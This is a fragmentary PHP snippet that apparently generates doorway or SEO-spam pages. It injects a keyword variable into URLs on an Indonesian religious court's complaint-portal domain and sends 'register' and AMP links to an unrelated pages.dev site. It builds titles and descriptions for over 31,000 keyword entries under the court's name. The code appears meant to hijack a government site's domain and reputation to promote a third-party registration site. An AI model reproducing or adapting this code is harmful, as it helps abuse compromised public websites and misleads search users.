...
$baseAuthor = $BRAND;
$URL  = "https://cpar.pa-ngawi.go.id/cpar/?ninja=$BRAND";
$PAGEURL = "https://cpar.pa-ngawi.go.id/cpar/?ninja=$BRAND";
$AMP = "https://polimediaall.pages.dev/$BRAND";
$DAFTAR = "https://polimediaall.pages.dev/";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND # E-CPAR PENGADILAN AGAMA NGAWI ";
    $DESCRIPTION = "$BRAND PENGADILAN AGAMA NGAWI. Keluhan Tentang Tempat Parkir. Kirim. © Copyright CPAR. IT Pengadilan Agama Ngawi.
";
    $description = "$BRAND PENGADILAN AGAMA NGAWI. Keluhan Tentang Tempat Parkir. Kirim. © Copyright CPAR. IT Pengadilan Agama Ngawi.
";
}
